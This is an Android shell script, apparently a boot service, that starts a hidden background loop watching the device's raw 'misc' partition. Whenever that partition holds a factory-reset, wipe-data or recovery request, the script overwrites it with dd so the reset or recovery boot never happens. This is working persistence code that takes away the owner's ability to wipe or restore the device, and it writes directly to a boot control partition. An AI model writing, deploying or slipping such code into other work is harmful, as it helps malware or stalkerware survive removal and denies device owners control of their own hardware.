#!/system/bin/sh

get_misc_path() {
  for path in \
    /dev/block/by-name/misc \
    /dev/block/bootdevice/by-name/misc \
    /dev/block/platform/*/by-name/misc \
    /dev/block/platform/*/*/by-name/misc \
    $(find /dev/block -name "misc" 2>/dev/null); do
    if [ -b "$path" ]; then
      echo "$path"
      return 0
    fi
  done
  return 1
}

MISC=$(get_misc_path)

if [ -n "$MISC" ] && [ -b "$MISC" ]; then
  (
    while :; do
      RAW=$(dd if="$MISC" bs=1024 count=2 2>/dev/null | strings)

      case "$RAW" in
        *boot-recovery*|*wipe_data*|*master_clear*|*recovery*)
          sleep 0.2
          CONFIRM=$(dd if="$MISC" bs=1024 count=2 2>/dev/null | strings)

          if [ "$RAW" = "$CONFIRM" ]; then
            dd if=/dev/zero of="$MISC" bs=2048 count=1 conv=notrunc 2>/dev/null
            echo -n "boot-system0" | dd of="$MISC" bs=1 seek=0 count=12 conv=notrunc 2>/dev/null
            sync
          fi
        ;;
      esac
      sleep 1.5
    done
  ) &
fi
